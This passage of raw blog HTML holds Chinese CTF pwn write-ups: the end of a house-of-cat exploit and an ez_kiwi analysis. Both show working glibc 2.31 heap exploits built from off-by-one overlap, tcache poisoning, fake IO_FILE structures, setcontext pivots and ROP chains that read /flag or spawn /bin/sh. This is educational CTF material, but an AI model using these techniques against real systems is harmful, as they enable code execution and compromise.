class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br></code></pre></td></tr></table></figure><h5 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h5><p>写入堆中的数据要注意setcontext的执行 与orw中gadget的位置，具体构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br></code></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25381</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Any data?&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>IO_2_1_stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>IO_wfile_jumps = libcbase + <span class="hljs-number">0x1e8de0</span><br>magic_gadget = libcbase + <span class="hljs-number">0x151990</span><br><span class="hljs-comment">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>pop_rax = libcbase + <span class="hljs-number">0x36174</span><br>ret = libcbase + <span class="hljs-number">0x22679</span><br>syscall_ret = libcbase + <span class="hljs-number">0x630a9</span><br>setcontext = libcbase + <span class="hljs-number">347936</span><br>mp = libcbase + <span class="hljs-number">2015944</span><br><br>add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-comment">#print(hex(heap_addr))</span><br>orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br>edit(<span class="hljs-number">0</span>, payload)<br><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(-<span class="hljs-number">8</span>).encode())<br><br>p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, fake_IO_FILE)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>​                                                                                         </p><p>关于house of cat我没有讲的太详细，大家可以参考看雪大佬的这篇文章<a href="https://bbs.pediy.com/thread-273895.htm">https://bbs.pediy.com/thread-273895.htm</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Dest0g3 520迎新赛 pwn ez_kiwi</title>
    <link href="/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/"/>
    <url>/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/</url>
    
    <content type="html"><![CDATA[<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>题目环境：glibc-2.31</p><p>如图在edit的过程中对重新输入的字符长度未有效检查，造成单字节溢出。</p><p><img src="/img/1/1.png"></p><p> 这时我们就可利用这一漏洞让堆块重叠，从而泄漏libc的地址</p><p>泄漏libc的地址首先想到的就是unsorted bin中的main_arena，由于存在tcache，必须释放8个大小相同才会进入unsorted bin；在add的过程中输入的idx可以小于0xf，但实际上超过9就无法正常申请，所以我们在申请释放时要小心堆块不够和top chunk的合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):          <br>    add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#重叠的堆块</span><br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#先释放进入tcache，不会top chunk的合并</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>这时就可以得到libc的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br></code></pre></td></tr></table></figure><p>一般情况下我们会修改tcache的fd指针，指向<code>__malloc_hook</code>和<code>__free_hook</code>,再次申请时就使用system或者one_gadget去填充该地址。但是这题故意不让你去这样去使用，每次重新开始循环时会调用clear函数将<code>__malloc_hook</code>和<code>__free_hook</code>全部重置为0。</p><img src="/img/1/2.png"  /><p><img src="/img/1/3.png"></p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>这时我们就需要使用house of kiwi这种方式，修改<code>_IO_file_sync</code>和<code>_IO_helper_jumps</code>中的值。</p><p>具体过程便是触发<code>__malloc_assert</code>后，去执行fflush (stderr)，会使用<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>，RDX寄存器的值为<code>IO_helper_jumps</code>指针,RDX始终是一个固定的地址。</p><img src="/img/1/5.png"><p>然后<strong>通过 setcontext 控制寄存器的值</strong>。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; disassemble setcontext<br>   <span class="hljs-number">0x00007f38b563d0dd</span> &lt;+<span class="hljs-number">61</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa0</span>]#利用代码<br>   <span class="hljs-number">0x00007f38b563d0e4</span> &lt;+<span class="hljs-number">68</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x00007f38b563d0eb</span> &lt;+<span class="hljs-number">75</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0x00007f38b563d0ef</span> &lt;+<span class="hljs-number">79</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x48</span>]<br>   <span class="hljs-number">0x00007f38b563d0f3</span> &lt;+<span class="hljs-number">83</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x50</span>]<br>   <span class="hljs-number">0x00007f38b563d0f7</span> &lt;+<span class="hljs-number">87</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x58</span>]<br>   <span class="hljs-number">0x00007f38b563d0fb</span> &lt;+<span class="hljs-number">91</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x00007f38b563d0ff</span> &lt;+<span class="hljs-number">95</span>&gt;:    <span class="hljs-keyword">test</span>   <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x48</span>,<span class="hljs-number">0x2</span><br>   <span class="hljs-number">0x00007f38b563d10b</span> &lt;+<span class="hljs-number">107</span>&gt;:   <span class="hljs-keyword">je</span>     <span class="hljs-number">0x7f38b563d1c6</span> &lt;setcontext+<span class="hljs-number">294</span>&gt;<br>   …………<br>   …………<br>   <span class="hljs-number">0x00007f38b563d1c6</span> &lt;+<span class="hljs-number">294</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa8</span>]#利用代码<br>   <span class="hljs-number">0x00007f38b563d1cd</span> &lt;+<span class="hljs-number">301</span>&gt;:   <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0x00007f38b563d1ce</span> &lt;+<span class="hljs-number">302</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x00007f38b563d1d2</span> &lt;+<span class="hljs-number">306</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x68</span>]<br>   <span class="hljs-number">0x00007f38b563d1d6</span> &lt;+<span class="hljs-number">310</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x98</span>]<br>   <span class="hljs-number">0x00007f38b563d1dd</span> &lt;+<span class="hljs-number">317</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x28</span>]<br>   <span class="hljs-number">0x00007f38b563d1e1</span> &lt;+<span class="hljs-number">321</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x30</span>]<br>   <span class="hljs-number">0x00007f38b563d1e5</span> &lt;+<span class="hljs-number">325</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x88</span>]<br>   <span class="hljs-number">0x00007f38b563d1ec</span> &lt;+<span class="hljs-number">332</span>&gt;:   <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00007f38b563d1ee</span> &lt;+<span class="hljs-number">334</span>&gt;:   <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>设置<code>rdx + 0xa0</code>来控制rsp，也就是控制了栈的地址，通过最后的ret指令就可以执行ROP。</p><p>攻击流程如下</p><p>将<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>修改为<code>setcontext + 61</code>的地址，让程序执行setcontext中的代码；同时修改<code>_IO_helper_jumps + 0xa0 和 _IO_helper_jumps + 0xa8</code>分别存放有ROP的位置和ret指令的gadget位置。题目提供了libc文件，只需在libc中找到相应的gadget再加上libc的基地址即可，可以通过泄漏堆的地址来存放gadget。</p><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>关于IO_helper_jumps的地址寻找：由于pwntools无法从文件直接得到IO_helper_jumps的信息，于是我们可以直接通过这道题提供的libc文件利用ida中找到偏移；但如果是从pwndbg中寻找，找到的地址并不是<code>_IO_file_sync</code>中所利用的那个地址，对比下图和上图就会发现需要-0xc0才是我们所需要的地址。</p><p><img src="/img/1/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br></code></pre></td></tr></table></figure><p> 利用0x20大小的堆块重叠，可以修改tcache中的fd指针，就可对<code>IO_file_jumps</code>的地址修改，并泄漏堆的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br></code></pre></td></tr></table></figure><p>使用ROPgadget 找到相应的gadget，利用系统调用去执行execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) （储存&#x2F;bin&#x2F;sh的地址自己找好偏移即可）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br></code></pre></td></tr></table></figure><p>继续利用0x20大小的堆块重叠，去修改<code>_IO_helper_jumps + 0xa0 和 _IO_helper_jumps + 0xa8</code>中的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br></code></pre></td></tr></table></figure><p>关于触发<code>__malloc_assert</code>：在top chunk不够使用时就使用sysmalloc，同时对top chunk进行一系列检查，这里我们不是为了绕过检查，而是故意让其不能通过检查。这里改变top chunk的大小，使其不能页对齐，并使用gift()函数申请0x25000大小的堆块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br></code></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 